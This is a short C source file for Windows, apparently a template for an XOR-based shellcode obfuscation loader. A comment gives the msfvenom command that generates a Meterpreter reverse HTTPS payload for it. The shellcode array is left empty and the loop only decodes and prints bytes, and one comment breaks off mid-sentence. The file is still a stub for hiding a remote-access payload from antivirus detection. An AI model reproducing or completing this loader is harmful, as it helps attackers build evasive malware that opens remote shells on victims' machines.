#include <Windows.h>
#include<stdio.h>
#define KEY 0x01
int main() {
	//msfvenom -p windows/x64/meterpreter/reverse_https  Lhost= Lport= -f c
	char encryptedShellcode[] ="";

    char key[] = "key";
	char cipherType[] = "xor";
	// Char array to host the deciphered shellcode
	unsigned char shellcode[sizeof encryptedShellcode];
	// XOR decoding stub using the key defined above must be the same as the
	int j = 0;
	for (int i = 0; i < sizeof encryptedShellcode; i++) {
		if (j == sizeof key - 1) j = 0;
		shellcode[i] = encryptedShellcode[i] ^ key[j];
		j++;
		printf("\\x%x", shellcode[i]);
	}

}